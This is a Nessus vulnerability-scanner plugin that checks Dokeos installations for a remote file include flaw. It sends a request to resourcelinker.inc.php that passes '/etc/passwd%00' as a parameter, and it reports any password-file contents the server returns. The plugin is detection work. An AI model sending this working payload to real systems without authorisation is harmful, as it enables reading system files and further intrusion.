#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is susceptible
to remote file include attacks. 

Description :

The remote host is running Dokeos, an open-source, e-learning and
course management web application written in PHP. 

The version of Dokeos installed on the remote host fails to sanitize
user-supplied input to several parameters before using it in several
scripts to include PHP code from other files.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these issues to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

See also :

http://www.dokeos.com/forum/viewtopic.php?t=6848
http://www.dokeos.com/wiki/index.php/Security#April_5th.2C_2006

Solution :

Upgrade to Dokeos 1.6.4 / Dokeos Community Release 2.0.3 or later. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);

if (description)
{
  script_id(21214);
  script_version("$Revision: 1.2 $");

  script_name(english:"Dokeos < 1.6.4 / 2.0.3 Remote File Include Vulnerabilities");
  script_summary(english:"Tries to read /etc/passwd using Dokeos");

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/dokeos", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to generate an error.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/claroline/resourcelinker/resourcelinker.inc.php?",
      "clarolineRepositorySys=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0lang/english/resourcelinker\.inc\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction or...
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:")) 
      contents = res - strstr(res, "<br />");

    if (isnull(contents)) report = desc;
    else
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the duplicated contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );

    security_warning(port:port, data:report);
    exit(0);
  }
}
